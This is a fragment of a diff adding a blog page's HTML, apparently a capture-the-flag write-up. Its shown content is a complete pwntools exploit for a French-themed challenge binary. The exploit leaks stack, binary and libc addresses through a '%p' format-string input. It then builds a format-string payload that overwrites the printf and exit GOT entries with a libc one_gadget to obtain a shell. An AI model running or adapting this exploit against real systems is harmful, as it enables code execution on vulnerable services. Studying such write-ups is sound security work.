+</span></span><span class="line"><span class="cl"><span class="c1">#pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
+</span></span><span class="line"><span class="cl"><span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
+</span></span><span class="line"><span class="cl"><span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
+</span></span><span class="line"><span class="cl"><span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
+</span></span><span class="line"><span class="cl"><span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
+</span></span><span class="line"><span class="cl"><span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">b help_christian
+</span></span></span><span class="line"><span class="cl"><span class="s1">continue
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Helping christian</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Filling required speech</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;M&#39;accuser, - justes dieux ! - De n&#39;aimer plus... quand... j&#39;aime plus !&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;L&#39;amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Aussi l&#39;ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;De sorte qu&#39;il... strangula comme rien... Les deux serpents... Orgueil et... Doute.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Leaking binary / libc / stack address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;sente donc la situation ?</span><span class="se">\n</span><span class="s2">[Vous] : &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%p&#34;</span> <span class="o">*</span> <span class="mi">48</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">leak_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">57</span><span class="p">:</span><span class="o">-</span><span class="mi">43</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4118720</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak_binary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">29</span><span class="p">:</span><span class="o">-</span><span class="mi">15</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">7884</span>
+</span></span><span class="line"><span class="cl">    <span class="n">help_christian</span> <span class="o">=</span> <span class="mh">0x00000970</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Binary mapped @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_binary</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Libc mapped @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Shelling a shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_binary</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;got.exit&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;got.printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">buffer_offset</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x10a2fc</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;One gadget @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_libc</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span> <span class="p">:</span> <span class="n">leak_libc</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">,</span> <span class="n">exit_got</span> <span class="p">:</span> <span class="n">leak_binary</span> <span class="o">+</span> <span class="n">help_christian</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span></code></pre></div></div>
+  
+    <div class="mt-16">
+
+</div>
+  
+</article>
+      </div>
+    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
+  <div class="flex justify-center items-center h-footer-height">
+    <div
+      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
+    >
+      <nav>
+        <a href="http://localhost:1313//index.xml"
+          ><svg
+            width="18px"
+            height="18px"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke-width="1.5"
+            stroke="currentColor"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
+            />
+          </svg>
+        </a>
+      </nav>
+      <span class="text-muted hidden md:block">
+        &copy;
+        2025
+        <a
+          href="https://github.com/ntk148v/hugo-toigian"
+          class="font-bold hover:underline"
+          >hugo-toigian</a
+        >
+      </span>
+      <div id="header-theme-button">
+        <svg
+          id="dark_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
+          />
+        </svg>
+        <svg
+          id="light_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
+          />
+        </svg>
+      </div>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
